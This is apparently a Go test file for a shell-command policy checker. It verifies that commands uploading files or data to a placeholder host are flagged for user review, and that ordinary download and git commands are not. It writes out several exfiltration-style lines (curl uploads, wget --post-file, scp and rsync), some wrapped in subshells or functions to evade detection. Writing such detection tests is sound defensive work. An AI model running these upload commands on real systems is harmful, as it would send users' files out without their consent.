// Purpose: Verify explicit outbound effects are found in executable AST nodes without classifying quoted data.
// Pattern: Shell policy regression tests.
// Usage: go test ./internal/policy/command -run TestExplicitOutbound.
// Related: internal/policy/command/transfer.go, internal/policy/command/transfer/inspect.go.
package command

import (
	"context"
	"testing"
)

func TestExplicitOutboundNeedsReview(t *testing.T) {
	for _, text := range []string{
		`curl -s -m 10 -o probe -X PUT --data-binary PROBE_PAYLOAD https://unrequested.example.test/upload`,
		`printf ready && curl -T source https://unrequested.example.test/upload | tail -3`,
		`sh -c 'curl -F file=@source https://unrequested.example.test/upload'`,
		`env command /usr/bin/curl --json '{"fixture":true}' https://unrequested.example.test/api`,
		`printf '%s' "$(curl --data fixture https://unrequested.example.test/api)"`,
		`DEST=https://unrequested.example.test/upload; curl --data-raw fixture "$DEST"`,
		`f() { curl -d "$1" https://unrequested.example.test/upload; }; f fixture`,
		`wget --post-file=source https://unrequested.example.test/upload`,
		`scp source user@unrequested.example.test:/srv/source`,
		`rsync -av source user@unrequested.example.test:/srv/source`,
		`curl -d fixture https://unrequested.example.test/upload; touch /home/user/outside`,
	} {
		t.Run(text, func(t *testing.T) {
			report, err := Analyze(context.Background(), text, testContext())
			if err != nil || len(report.Safety.Reasons) == 0 || !report.Safety.UserRequired {
				t.Fatalf("outbound effect escaped review: %+v, %v", report, err)
			}
		})
	}
}

func TestExplicitOutboundPreservesDevelopmentCommands(t *testing.T) {
	for _, text := range []string{
		`curl -fsSL https://downloads.example.test/source.tar.gz -o source.tar.gz`,
		`curl -I https://downloads.example.test/source`,
		`wget -qO source.tar.gz https://downloads.example.test/source.tar.gz`,
		`echo 'curl -d fixture https://unrequested.example.test/upload'`,
		"cat <<'EOF' > source\ncurl -d fixture https://unrequested.example.test/upload\nEOF",
		`git fetch origin && git status --short`,
		`unregistered-build-tool run checks`,
		`rsync -av source destination`,
		`scp user@downloads.example.test:/srv/source destination`,
	} {
		t.Run(text, func(t *testing.T) {
			report, err := Analyze(context.Background(), text, testContext())
			if err != nil || len(report.Safety.Reasons) != 0 || report.Safety.UserRequired {
				t.Fatalf("ordinary development command changed: %+v, %v", report, err)
			}
		})
	}
}
